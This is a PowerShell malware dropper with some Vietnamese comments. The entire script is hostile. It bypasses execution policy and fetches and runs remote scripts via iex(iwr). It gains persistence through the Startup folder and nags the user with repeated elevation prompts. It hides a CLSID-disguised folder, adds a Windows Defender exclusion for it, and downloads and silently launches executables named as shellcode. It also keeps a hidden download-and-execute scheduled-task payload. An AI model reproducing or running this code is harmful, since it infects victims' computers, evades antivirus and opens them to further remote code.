Set-ExecutionPolicy Bypass -Scope Process -Force
$skid = "skid"
iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $startup = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
    
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/run.cmd" -OutFile "$startup\run.cmd"
    while(1) {
        try {
            Start-Process -Verb RunAs -FilePath '$startup\run.cmd';
            Remove-Item -Path "$startup\run.cmd"
            Stop-Process $pid -Force
        } catch {}
    }
}

iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/startup.ps1" -useb)


$rdir = "C:\Users\hai1723"
$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir

$temp = "$dir\temp"
New-Item -ItemType Directory -Path $temp

Add-MpPreference -ExclusionPath $dir

# $shellcode = ("https://raw.githubusercontent.com/43a1723/test/main/Extras/shellcode.ps1")
# $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
# Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru

Invoke-WebRequest -Uri "https://anonsharing.com/file/8b24841448995265/shellcode_(3).exe" -OutFile "$temp\s.exe"
Start-Process -FilePath "$temp\s.exe"

Invoke-WebRequest -Uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/LMAO_protected.exe" -OutFile "$temp\skid.exe"
Start-Process -FilePath "$temp\skid.exe" -WindowStyle Hidden

Get-ChildItem -Path $dir | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object {
    Write-Output $_.FullName
    Start-Process -FilePath $_.FullName
}

# Định nghĩa biến $urlToCheck và $arguments
$urlToCheck = "https://raw.githubusercontent.com/43a1723/test/main/download.ps1"
$arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `& { IEX (New-Object Net.WebClient).DownloadString('$urlToCheck') }"

# Lấy danh sách tất cả các tác vụ đã lên lịch
$tasks = Get-ScheduledTask

foreach ($task in $tasks) {
    try {
        # Lấy thông tin chi tiết về tác vụ
        $taskInfo = Get-ScheduledTaskInfo -TaskName $task.TaskName
        $taskAction = $taskInfo.Actions | Where-Object { $_.Execute -like "*powershell.exe*" }

        # Kiểm tra xem hành động của tác vụ có chứa URL cụ thể không
        if ($taskAction.Argument -like "*$urlToCheck*" -and $taskAction.Argument -ne $arguments) {
            # Nếu hành động chứa URL cần xoá và không chứa $arguments, xoá tác vụ
            Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false
            Write-Output "Task $($task.TaskName) has been deleted."
        }
    } catch {
        Write-Output "Failed to process task $($task.TaskName): $_"
    }
}
